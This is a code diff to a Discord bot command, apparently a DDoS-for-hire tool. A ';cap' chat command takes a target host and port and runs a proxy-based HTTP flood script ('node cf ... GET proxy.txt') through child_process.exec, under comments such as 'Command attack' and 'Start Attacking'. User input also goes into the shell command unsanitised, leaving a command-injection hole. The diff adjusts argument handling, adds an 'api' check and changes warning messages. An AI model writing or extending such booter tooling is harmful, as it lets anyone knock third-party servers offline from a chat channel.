@@ -7,7 +7,7 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const reqip = message.content.split (" ")[3]
+const api = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -17,7 +17,8 @@ if (message.channel.id != room) {
 
 function Warn(message) {
   var embed0 = new Discord.MessageEmbed()
-  .setTitle(message)
+  .setTitle("WARNING!!")
+  .setDescription(message)
   .setColor("RANDOM")
   return embed0;
 }
@@ -31,7 +32,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;cap target time reqip`")
+	.setDescription("`Ex ;cap target time`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -42,6 +43,14 @@ if(!args[0]) {
   message.channel.send(Warn("TARGET IS BLACKLISTED!"));
   return;
 }
+  if (Number(api) > ayarlar.apis) {
+    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
+    return;
+  }
+  if (Number(api) < ayarlar.apis) {
+    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
+    return;
+  }
   if (isLetter(port)) {
     message.channel.send(Warn("time cannot contain characters!"));
     return;
@@ -59,7 +68,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 100 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 100 GET proxy.txt 200`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
